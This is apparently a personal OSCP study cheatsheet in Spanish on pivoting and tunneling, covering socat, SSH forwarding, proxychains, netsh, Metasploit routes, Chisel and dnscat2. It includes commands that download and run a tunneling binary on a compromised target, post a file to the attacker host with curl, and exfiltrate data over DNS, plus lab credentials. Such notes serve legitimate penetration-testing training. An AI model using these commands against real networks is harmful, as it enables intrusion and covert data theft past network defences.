---
tipo: cheatsheet
tags: [oscp, cheatsheet]
---

# Cheatsheet: Pivoting y Tunneling

> [!info] Comandos añadidos a medida que avanzo en los módulos.

## Port forwarding — Socat (Linux)
Ver → [[19 - Port Redirection and SSH Tunneling]]. Mismo host escucha y reenvía.
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   # fork = varias conexiones
# desde Kali: psql -h <PIVOT> -p 2345 -U postgres
```

## SSH port forwarding
Ver → [[SSH Port Forwarding]]. **local/dynamic → puerto en el CLIENTE** · **remote/remote-dynamic → puerto en Kali**.
```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@PIVOT    # local   (1 socket, escucha en cliente)
ssh -N -D 0.0.0.0:9999 user@PIVOT                       # dynamic (SOCKS en cliente)
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@KALI     # remote  (escucha en Kali)
ssh -N -R 9998 kali@KALI                                # remote dynamic (SOCKS en Kali, OpenSSH>=7.6)
sudo systemctl start ssh                                # habilitar sshd en Kali (para remote*)
ss -ntplu                                               # comprobar dónde quedó el puerto
```

## Proxychains / sshuttle
Ver → [[Proxychains]].
```bash
# /etc/proxychains4.conf -> [ProxyList] -> socks5 <IP> <PORT>   (bajar *_time_out para ir rápido)
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217     # SOCKS: nmap -sT -Pn
sshuttle -r user@PIVOT:2222 10.4.50.0/24 172.16.50.0/24             # VPN-like (root en Kali + py3 en server)
```

## Nmap sobre Proxychains (varios hosts internos)
```bash
sudo proxychains -q nmap -sT -Pn -p 21,80,443 <IP1> <IP2> <IP3> -oN nmap_internos.txt
```
`-sT` es obligatorio (un SYN scan `-sS` no funciona a través de un proxy SOCKS); `-Pn` evita el ping previo (ICMP no pasa por el proxy).

## Port forwarding — Windows
Ver → [[19 - Port Redirection and SSH Tunneling]].
```powershell
ssh -N -R 9998 kali@KALI                                # ssh.exe nativo (remote dynamic)
# Plink (PuTTY CLI, sin remote dynamic):
plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 KALI
cmd.exe /c echo y | .\plink.exe -ssh ...                # auto-aceptar host key en shell limitada
# Netsh portproxy (nativo, requiere admin + abrir regla firewall):
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<WAN> connectport=22 connectaddress=<DEST>
netsh advfirewall firewall add rule name="pf_2222" protocol=TCP dir=in localip=<WAN> localport=2222 action=allow
netsh interface portproxy show all
# LIMPIAR al terminar:
netsh advfirewall firewall delete rule name="pf_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<WAN>
```

## Pivoting con Metasploit
Ver → [[Metasploit]] · [[21 - The Metasploit Framework]] · [[Pivoting con Meterpreter SOCKS Proxy]]. Rutas por una sesión; a través de ruta usa payloads **bind**.
```text
route add 172.16.5.0/24 <sid>                       # ruta manual (o: use multi/manage/autoroute)
use auxiliary/server/socks_proxy ; set VERSION 5 ; run -j   # SOCKS 1080 -> proxychains
portfwd add -l 3389 -p 3389 -r <ip_interna>          # port forward desde la sesión meterpreter
```

## HTTP tunneling — Chisel
Ver → [[HTTP Tunneling con Chisel]]. Encapsula TCP en HTTP/WebSocket cuando el perímetro solo deja pasar HTTP.
```bash
# Subir el binario al target
sudo cp $(which chisel) /var/www/html/ && sudo systemctl start apache2
# target (inyección): wget <KALI>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Server (Kali) + client (target) -> reverse SOCKS en 1080 de Kali
chisel server --port 8080 --reverse
/tmp/chisel client <KALI>:8080 R:socks > /dev/null 2>&1 &

# Comprobar y usar
ss -ntplu                                   # 127.0.0.1:1080 LISTEN (chisel)
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<IP_INTERNA>

# Binario incompatible (glibc): usar el oficial compilado con Go 1.19
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz && sudo cp ./chisel /var/www/html

# Leer stderr de un proceso en background vía HTTP
/tmp/chisel client <KALI>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://<KALI>:8080/
sudo tcpdump -nvvvXi tun0 tcp port 8080
```
```powershell
# Reenvío de puerto inverso puntual (en vez de SOCKS completo) -> navegar directo a un servicio interno
# sintaxis: R:localport:remotehost:remoteport
chisel.exe client <KALI>:8080 R:80:172.16.6.241:80
# en Kali, tras conectar: abrir http://127.0.0.1/ en el navegador -> llega a 172.16.6.241:80
```

## DNS tunneling — dnscat2 / Dnsmasq
Ver → [[DNS Tunneling con dnscat2]]. Exfil en subdominios, infil en TXT/CNAME/MX; cuando solo se permite DNS.
```bash
# dnscat2
dnscat2-server feline.corp                  # authoritative NS (Kali)
./dnscat feline.corp                         # client en el host comprometido
# command session:  listen 127.0.0.1:4455 172.16.2.11:445   # port forward tipo ssh -L
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

# Fundamentos con Dnsmasq
sudo dnsmasq -C dnsmasq.conf -d              # authoritative mínimo (auth-zone/auth-server)
nslookup <dato>.feline.corp                  # exfil: el subdominio es el dato
nslookup -type=txt www.feline.corp           # infil: TXT (txt-record= en la config)
sudo tcpdump -i ens192 udp port 53
resolvectl status ; resolvectl flush-caches  # ver/limpiar DNS (systemd-resolved)
```
</content>
